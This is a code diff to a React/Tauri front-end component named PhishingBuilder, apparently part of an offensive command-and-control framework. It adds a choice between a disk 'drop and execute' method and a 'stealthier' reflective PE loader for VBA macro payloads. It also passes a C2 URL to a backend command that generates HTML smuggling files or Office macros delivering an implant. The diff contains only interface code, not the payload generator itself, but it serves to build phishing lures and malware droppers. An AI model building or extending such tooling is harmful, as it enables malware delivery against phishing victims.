@@ -4,6 +4,7 @@ import { save } from '@tauri-apps/plugin-dialog';
 
 export default function PhishingBuilder() {
     const [type, setType] = useState('html');
+    const [method, setMethod] = useState('drop');
     const [c2Url, setC2Url] = useState('http://localhost:8080');
     const [status, setStatus] = useState('');
 
@@ -20,14 +21,10 @@ export default function PhishingBuilder() {
 
             setStatus('Generating...');
             await invoke('create_phishing', { 
-                type_: type,  // Rust arg is type_, JS sends mapped name usually? 
-                // Tauri command args match Rust function arg names.
-                // In lib.rs: fn create_phishing(type_: String, ...)
-                // So key should be 'type_'? 
-                // Tauri 2.0 usually renames `type` to `type_` automatically if it's a keyword in Rust but valid in JS?
-                // Or we match exact Rust argument name. Rust arg is `type_`.
+                type_: type,
                 c2Url, 
-                savePath 
+                savePath,
+                method: type === 'macro' ? method : undefined
             });
             setStatus('Generated successfully!');
         } catch (e) {
@@ -52,9 +49,28 @@ export default function PhishingBuilder() {
                 <p className="text-xs text-slate-400">
                     {type === 'html' ? 
                         "Generates an HTML file that uses JavaScript to drop and execute the implant via an ISO/ZIP container." : 
-                        "Generates VBA code to be embedded in an Office document. Uses basic shellcode injection."}
+                        "Generates VBA code to be embedded in an Office document."}
                 </p>
             </div>
+
+            {type === 'macro' && (
+                <div className="space-y-2">
+                    <label className="block text-sm font-medium">Injection Method</label>
+                    <select 
+                        value={method} 
+                        onChange={(e) => setMethod(e.target.value)}
+                        className="w-full p-2 rounded bg-slate-800 border border-slate-700 focus:border-red-500 focus:outline-none"
+                    >
+                        <option value="drop">Drop and Execute (Disk)</option>
+                        <option value="memory">Reflective PE Loader (Memory)</option>
+                    </select>
+                    <p className="text-xs text-slate-400">
+                        {method === 'drop' ? 
+                            "Writes the payload to %TEMP% and executes it. More reliable but leaves artifacts." : 
+                            "Loads the payload directly into memory using a VBA-based PE loader. Stealthier but complex."}
+                    </p>
+                </div>
+            )}
 
             <div className="space-y-2">
                 <label className="block text-sm font-medium">C2 Connection URL</label>
